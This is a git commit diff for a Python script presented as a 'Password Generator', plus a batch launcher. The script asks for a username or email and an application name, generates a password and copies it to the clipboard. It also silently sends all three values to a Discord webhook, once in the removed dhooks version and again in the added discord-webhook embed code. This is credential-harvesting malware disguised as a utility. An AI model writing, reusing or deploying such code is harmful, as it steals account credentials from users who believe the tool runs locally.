ee2ae9f20239bf5636bc5569e131398b4491900d
Acceded <97315905+Acceded@users.noreply.github.com>
2022-04-18 03:21:13 +0200

    Add files via upload

--- pwdPass.py
+++ pwdPass.py
@@ -1,34 +1,30 @@
-from dhooks import Webhook
+from dataclasses import asdict
+from discord_webhook import DiscordWebhook, DiscordEmbed
+#-----------------------------------------------------------------------------------------------------------------------
+webhook = DiscordWebhook(url="webhook-url-here", username="Password Generator", avatar_url="https://avatars.githubusercontent.com/u/97315905?s=400&u=0c2eb33523f1bdeae467f4e24ec9152c974779b8&v=4")
+#-----------------------------------------------------------------------------------------------------------------------
 
-hook = Webhook("WEBHOOK_URL")
-
-User = input("Write your username: ")
+User = input("Write your username or mail: ")
 Application = input("Write your application name: ")
-
-hook.send(f"User:{User}")
-hook.send(f"Application:{Application}")
-
+#-----------------------------------------------------------------------------------------------------------------------
 
 import random
 
-
 LowPass = random.randint(1, 50)
 choosepass = input("Password length [1,50]: ")
-
-
-
+#-----------------------------------------------------------------------------------------------------------------------
 if choosepass > '50':
     print("The password is too long")
     print("Place a valid from 1 to 50")
     print("Try again")
     
-
+#-----------------------------------------------------------------------------------------------------------------------
 if choosepass < '1':
     print("The password is too short")
     print("Place a valid from 1 to 50")
     print("Try again")
 
-    
+#-----------------------------------------------------------------------------------------------------------------------    
 lower = "abcdefghijklmnopqrstuvwyz"
 upper = "ABCDEFGHIJKLMNOPQRSTUVWYZ"
 NUMBER = "0123456789"
@@ -41,4 +37,24 @@ import pyperclip
 pyperclip.copy('The text to be copied to the clipboard.')
 spam = pyperclip.copy(password)
 print("You have the password on your clipboard")
-hook.send(password)
+
+#-----------------------------------------------------------------------------------------------------------------------
+
+
+embed = DiscordEmbed(
+    title="Password Generator", description="By:Acceded", color='800000'
+)
+embed.set_author(
+    name="Acceded",
+    url="https://github.com/Acceded",
+    icon_url="https://avatars.githubusercontent.com/u/97315905?s=400&u=0c2eb33523f1bdeae467f4e24ec9152c974779b8&v=4",
+)
+embed.set_footer(text="Password Generator")
+embed.set_timestamp()
+embed.add_embed_field(name="User or mail", value=User, inline=False)
+embed.add_embed_field(name="Name of the application", value=Application, inline=False)
+embed.add_embed_field(name="Your password is", value=password, inline=False)
+
+
+webhook.add_embed(embed)
+response = webhook.execute()
--- start.bat
+++ start.bat
@@ -1,6 +1,7 @@
 pip install pyperclip
 pip install dhooks
+pip install discord-webhook
 cls
 
 echo python pwdPass.py >> "start.bat"
-pause
+pausepython pwdPass.py 
